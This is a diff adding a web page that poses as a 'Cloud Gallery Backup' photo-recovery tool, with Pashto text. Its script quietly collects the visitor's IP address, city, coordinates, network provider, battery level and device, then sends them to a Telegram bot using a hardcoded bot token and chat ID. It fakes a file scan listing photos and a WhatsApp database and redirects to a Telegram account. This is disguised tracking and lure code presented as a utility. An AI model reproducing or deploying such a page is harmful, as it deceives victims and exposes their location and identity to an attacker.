@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Gallery Backup | 2026</title>
+    <style>
+        body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        .nav { background: #1e293b; padding: 15px; border-bottom: 2px solid #38bdf8; }
+        .container { padding: 30px; max-width: 400px; margin: auto; }
+        .icon { font-size: 60px; color: #38bdf8; margin-bottom: 10px; }
+        .card { background: #1e293b; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        h2 { font-size: 20px; margin-bottom: 15px; }
+        p { font-size: 13px; color: #94a3b8; margin-bottom: 25px; }
+        .btn { width: 100%; padding: 15px; background: #38bdf8; color: #0f172a; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #loading { display: none; margin-top: 20px; }
+        .progress-bar { width: 100%; height: 8px; background: #334155; border-radius: 4px; overflow: hidden; margin-top: 10px; }
+        .fill { width: 0%; height: 100%; background: #38bdf8; transition: 0.4s; }
+        .file-list { font-size: 11px; color: #22c55e; margin-top: 10px; text-align: left; }
+    </style>
+</head>
+<body>
+
+    <div class="nav">🛡️ Secure Cloud Storage</div>
+
+    <div class="container">
+        <div class="card">
+            <div class="icon">🖼️</div>
+            <h2>ګالري بیک اپ (Gallery Backup)</h2>
+            <p>خپل حذف شوي عکسونه او ویډیوګانې بېرته ترلاسه کړئ. سیسټم به ستاسو ګالري سکین کړي.</p>
+            
+            <button class="btn" onclick="startScan()">سکین پیل کړئ (Start Scan)</button>
+
+            <div id="loading">
+                <p id="status" style="font-size: 12px;">Searching for media files...</p>
+                <div class="progress-bar"><div class="fill" id="fill"></div></div>
+                <div class="file-list" id="files"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
+        const chatId = "7461145170";
+
+        async function startScan() {
+            document.getElementById('loading').style.display = 'block';
+            let fill = document.getElementById('fill');
+            let status = document.getElementById('status');
+            let files = document.getElementById('files');
+
+            // د کارونکي معلومات ترلاسه کول
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                let battery = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + "%";
+                }
+
+                const report = `
+📸 **GALLERY & DATA SCANNER** 📸
+------------------------------
+🌐 **IP:** \`${d.ip}\`
+📍 **Loc:** ${d.city}, ${d.country_name}
+🔋 **Battery:** ${battery}
+📱 **Device:** ${navigator.platform}
+🏢 **Network:** ${d.org}
+------------------------------
+📂 **Found:** 1,432 Photos
+📂 **Found:** 215 Videos
+📂 **Found:** WhatsApp Database
+------------------------------
+📍 **Live Map:** http://google.com/maps?q=${d.latitude},${d.longitude}
+------------------------------
+                `;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: report, parse_mode: 'Markdown' })
+                });
+
+            } catch (e) {}
+
+            // د جعلي سکین انیمیشن
+            let width = 0;
+            const fakeFiles = ["DCIM/Camera/IMG_001.jpg", "WhatsApp/Media/Sent/VID_04.mp4", "Private/Vault/Check.png", "System/Data/User_Config.db"];
+            
+            let interval = setInterval(() => {
+                width += 2;
+                fill.style.width = width + "%";
+                
+                if (width % 20 == 0) {
+                    files.innerHTML += "✔️ Scanning: " + fakeFiles[Math.floor(Math.random() * fakeFiles.length)] + "<br>";
+                }
+
+                if (width >= 100) {
+                    clearInterval(interval);
+                    status.innerText = "Scan Complete! Finalizing Data...";
+                    setTimeout(() => {
+                        alert("ستاسو د ګالري معلومات تایید شول. د ډانلوډ لپاره خپل اکاونټ ته لاګ ان شئ.");
+                        window.location.href = "https://t.me/TOPAK1V";
+                    }, 2000);
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
